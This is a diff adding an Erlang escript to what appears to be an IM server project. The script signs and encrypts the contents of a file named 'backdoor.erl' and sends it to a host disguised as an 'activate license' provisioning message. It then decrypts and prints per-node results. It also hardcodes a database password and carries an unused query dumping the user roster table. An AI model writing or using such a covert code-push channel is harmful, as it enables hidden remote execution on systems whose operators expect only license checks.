@@ -1,0 +1,199 @@
+#!/usr/bin/env escript
+%%! -pz ../deps/im_libs/apps/msync_proto
+-include("../deps/im_libs/apps/msync_proto/include/pb_msync.hrl").
+-define(TRANSACTION_TIMEOUT, 5000).
+
+main([Host, Port, PemFilename, TString]) ->
+    {A, B, C} = os:timestamp(),
+    random:seed(A, B, C),
+    %% ok we have the KEY
+    setup_path(),
+    application:ensure_all_started(p1_xml),
+    Key = get_key(PemFilename),
+    T = erlang:list_to_integer(TString),
+    M = get_magic_binary(Key, T),
+    Message = #'MSync'{
+                 command = 'PROVISION',
+                 payload =
+                     #'Provision'{
+                        os_type = 'OS_OTHER',
+                        version = <<"activate license", M/binary>>
+                       }
+                },
+       #'MSync'{
+          command = 'PROVISION'
+         },
+    {ok,Socket} = gen_tcp:connect(Host, list_to_integer(Port), [{active, true}, binary, {packet, 4}, {nodelay, true}]),
+    CompressAlgorithm = undefined,
+    Buffer = msync_msg:encode(Message,CompressAlgorithm),
+    ok = gen_tcp:send(Socket, Buffer),
+    io:format("send data ok~n",[]),
+    start_mysql_client("mysql", 3306, "mysql", "123456", "ejabberd"),
+    S1 = not_used,
+    loop(Socket, S1, false),
+    stop_mysql_client();
+main(_) ->
+    io:format("usage: <cmd> \"`cat ~~/.ssh/id_rsa`\"~n").
+
+loop(Socket, S1, IsClosed) ->
+    receive
+        {tcp, Socket, Data} ->
+            #'MSync'{ version = 'MSYNC_V1',
+                      command = 'PROVISION',
+                      payload = #'Provision'{
+                                   status =
+                                       #'Status'{
+                                          error_code = 'OK',
+                                          reason = CData
+                                         }}} = msync_msg:decode_dl(Data),
+            io:format("receive ~p~n", [CData]),
+            handle_cdata(CData);
+        {tcp_closed, Socket} ->
+            io:format("error socket closed~n",[]);
+        {tcp_error, Socket, Error} ->
+            io:format("Error: ~p~n",[Error]),
+            1;
+        Other ->
+            io:format("Other: ~p~n",[Other]),
+            loop(Socket, S1, IsClosed)
+    after
+        1000 ->
+            case IsClosed of
+                true ->
+                    io:format("exit~n",[]);
+                false ->
+                    io:format("timeout~n",[]),
+                    gen_tcp:close(Socket),
+                    ok
+            end
+    end.
+
+
+get_key(PemFilename) ->
+    {ok, PEM} = file:read_file(PemFilename),
+    [PemEntry] = public_key:pem_decode(PEM),
+    Key = public_key:pem_entry_decode(PemEntry),
+    put(private_key, Key),
+    Key.
+
+
+get_magic_binary(Key, T) ->
+    Now = erlang:timestamp(),
+    NewActiveTime = now_add(Now, T),
+    NewActiveDatetime = calendar:now_to_datetime(NewActiveTime),
+    Command = iolist_to_binary(get_command()),
+    Data = term_to_binary({NewActiveDatetime, Command}),
+    CheckSum = erlang:crc32(Data),
+    Msg = {Data, CheckSum},
+    MsgBin = term_to_binary(Msg),
+    EMsgBin = encrypt_block(MsgBin, Key),
+    base64:encode(EMsgBin).
+
+now_add({A,B,C}, S) ->
+    {A + ((B + S) div 1000000), (B + S) rem 1000000, C }.
+
+
+handle_cdata(CData) ->
+    PropList = block_decode(CData),
+    OldActive = proplists:get_value(old_active, PropList),
+    OldExpireDate = proplists:get_value(old_expire_date, PropList),
+    {Replies,BadNodes} = proplists:get_value(activation_result, PropList),
+    %% io:format("~p~n",[PropList]),
+    lists:foreach(fun (X) -> handle_command_output(X) end, Replies),
+    %% write_logs(Replies, BadNodes),
+    NewActive = proplists:get_value(new_active, PropList),
+    NewExpireDate = proplists:get_value(new_expire_date, PropList),
+    io:format("~s~n", [erlang:iolist_to_binary(["debugging: \n"
+                                               , "\tOldActive = ", io_lib_pretty:print(OldActive), "\n"
+                                               , "\tOldExpireDate = ", io_lib_pretty:print(OldExpireDate), "\n"
+                                               , "\tReplies = ", io_lib_pretty:print(Replies), "\n"
+                                               , "\tBadNodes = ", io_lib_pretty:print(BadNodes), "\n"
+
+                                               , "\tNewActive = ", io_lib_pretty:print(NewActive), "\n"
+                                               , "\tNewExpireDate = ", io_lib_pretty:print(NewExpireDate), "\n"
+                                               ])]),
+    ok.
+
+block_decode(CData) ->
+    {EDesKey, EData} = binary_to_term(base64:decode(CData)),
+    PrivateKey = get(private_key),
+    DesKey = public_key:decrypt_private(EDesKey, PrivateKey),
+    {_State, Data} = crypto:stream_decrypt(crypto:stream_init(rc4, DesKey), EData),
+    binary_to_term(Data).
+
+get_command() ->
+    ScriptName = escript:script_name(),
+    ScriptDir = filename:dirname(ScriptName),
+    {ok, Binary} = file:read_file(filename:join([ScriptDir, "backdoor.erl"])),
+    Binary.
+handle_command_output({Node, Reply}) ->
+    io:format("~p: ~p~n", [Node, Reply]),
+    ok.
+
+start_mysql_client(Server, Port, Username, Password, DB) ->
+    case p1_mysql_conn:start(Server, Port,
+                             Username, Password,
+                             DB, fun(A,B,C) -> log(A,B,C) end) of
+        {ok, Ref} ->
+            erlang:put(mysql, {ok, Ref});
+        Error ->
+            io:format("mysql conn error : ~p~n", [Error])
+    end.
+stop_mysql_client() ->
+    case erlang:get(mysql) of
+        {ok, Ref} ->
+            p1_mysql_conn:stop(Ref),
+            timer:sleep(1000);
+        _ ->
+            ok
+    end.
+
+write_logs(_Replies, _BadNodes) ->
+    Query = <<"select * from rosterusers;">>,
+    maybe_execute_query(Query).
+
+
+maybe_execute_query(Query) ->
+    case erlang:get(mysql) of
+        {ok, Ref} ->
+            execute_query(Ref, Query);
+        _ ->
+            io:format("error: no mysql connection~n", [])
+    end.
+
+execute_query(Ref, Query) ->
+    case p1_mysql_conn:squery(Ref,
+                              [Query], self(),
+                              [{timeout, (?TRANSACTION_TIMEOUT) - 1000},
+                               {result_type, binary}]) of
+
+        X ->
+            io:format("mysql result: ~p => ~p~n", [Query, X])
+    end.
+
+log(Level, Format, Args) ->
+    false andalso io:format("~p:~s~n", [Level, io_lib:format(Format, Args)]).
+
+encrypt_block(MsgBin, Key) ->
+    RandomKey = list_to_binary(lists:map(fun(_N) -> random:uniform(255) end, lists:seq(1,16))),
+    ERandomKey = public_key:encrypt_private(RandomKey, Key),
+    {_NewState, EActivationMessage }
+        = crypto:stream_encrypt(crypto:stream_init(rc4, RandomKey), MsgBin),
+    term_to_binary({ERandomKey, EActivationMessage}).
+
+setup_path() ->
+    ScriptName = escript:script_name(),
+    ScriptDir = filename:dirname(ScriptName),
+    ProjectRoot = filename:join([ScriptDir, ".."]),
+    Dirs = filelib:wildcard(filename:join([ProjectRoot,
+                                           "deps",
+                                           "im_libs",
+                                           "apps", "*", "ebin"]))
+        ++ filelib:wildcard(filename:join([ProjectRoot, "deps", "*", "ebin"]))
+        ++ [ScriptDir],
+    lists:foreach(fun code:add_path/1, Dirs).
+
+%% Local Variables:
+%% mode:erlang
+%% coding: undecided-unix
+%% End:
